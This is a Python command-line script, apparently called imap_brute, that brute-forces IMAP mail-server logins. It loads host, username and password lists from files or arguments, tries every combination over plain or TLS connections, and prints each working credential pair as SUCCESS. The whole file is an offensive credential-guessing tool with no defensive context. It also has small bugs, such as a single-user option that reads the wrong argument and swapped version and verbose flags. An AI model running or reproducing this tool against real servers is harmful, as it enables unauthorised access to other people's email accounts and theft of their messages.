import imaplib
import traceback
import argparse
import random
import socket
import ssl
import re
import os
import sys
import time




def get_file(filename):
	
	if not os.path.exists(filename):
		print('The file does not exist: {}'.format(filename))
		sys.exit()
	else:
		data = [line.rstrip('\n') for line in open(filename)]
		return data
		

def host_connect(args):
	host_targets = []
	host_list = []
	if args['tls']:
		if args['p']:
			imaplib.IMAP4_SSL_PORT = args['p']
	else:
		if args['p']:
			imaplib.IMAP4_PORT = args['p']		
			
	if args['H']:
		host_list = get_file(args['H'])
	if args['h']:
		host_list.append(args['h'])
		
	return host_list

		
def list_boxes(conn):
	status, labels = conn.list()
	if status == 'OK':
		respone = []
		for label in labels:
			#print(label.decode())
			children, folder = label.decode().replace('"', '').replace('\\', '').replace(' Junk', '').replace(' Trash', '').split(' / ')
			folder = folder.title()
			has_match = re.match('\(HasNoChildren.*|\(Marked HasNoChildren.*', children)
			has_child = re.match('\(HasChildren.*', children)
			if has_match:
				children = ''
			if has_child:
				#conn.select(folder)
				children = '\n\tSub Folders Availble'
			respone.append((folder, children))		
	return sorted(respone)


if __name__ == '__main__':
	__version__ = 0.1
	
	# Create parser
	parser = argparse.ArgumentParser(prog='imap_brute', description='IMAP bruting', add_help=False)
	
	host_group = parser.add_mutually_exclusive_group(required=True)
	host_group.add_argument('-h', help='host')
	host_group.add_argument('-H', help='file with hosts')
	
	
	user_group = parser.add_mutually_exclusive_group(required=True)
	user_group.add_argument('-user', help='username')
	user_group.add_argument('-U', help='file with usernames')
	
	password_group = parser.add_mutually_exclusive_group(required=True)
	password_group.add_argument('-pass', help='password')
	password_group.add_argument('-P', help='file with passwords')
	
	parser.add_argument('-tls', help='port', required=False, action='store_true')
	parser.add_argument('-p', help='port', required=False)
	parser.add_argument('--help', '-help', help='help menu', required=False, action='store_true')
	parser.add_argument('-v', help='version', required=False, action='store_true')
	parser.add_argument('-V', help='verbose', required=False, action='store_true')
	
	args = vars(parser.parse_args())

	
	if args['V']:
		print('version: {}'.format(__version__))
		sys.exit()
		
	if args['P']:
		pass_list = get_file(args['P'])
	elif args['pass']:
		pass_list = list([args['pass']])
		
	if args['U']:
		user_list = get_file(args['U'])
	elif args['user']:
		user_list = list([args['U']])	
	
	
	random.shuffle(user_list)
	random.shuffle(pass_list)
	
	print('\nAttempting IMAP logins:\n')
	seen = []
	host_list = host_connect(args)
	for passw in pass_list:
		for user in user_list:
			for host in host_list:
				if args['tls']:
					imapObj = imaplib.IMAP4_SSL(host)
				else:
					imapObj = imaplib.IMAP4(host)		
				
				if (host, user, passw) in seen:
					pass
				else:
					seen.append((host, user, passw))
					try:
						imapObj.login(user, passw)
						print('SUCCESS:\t{}\t{}:{}'.format(imapObj.host, user, passw))
						imapObj.logout()
						imapObj.close()
					except imapObj.error as e:
						if 'LOGIN failed' in str(e):
							print('FAIL:\t\t{}:{}'.format(user, passw))
						if 'Command received in Invalid state' in str(e):
							print('FAIL: TLS/SSL\n\nrequired argument: -tls')
							sys.exit()
						continue
					except Exception:
						print(traceback.print_exc())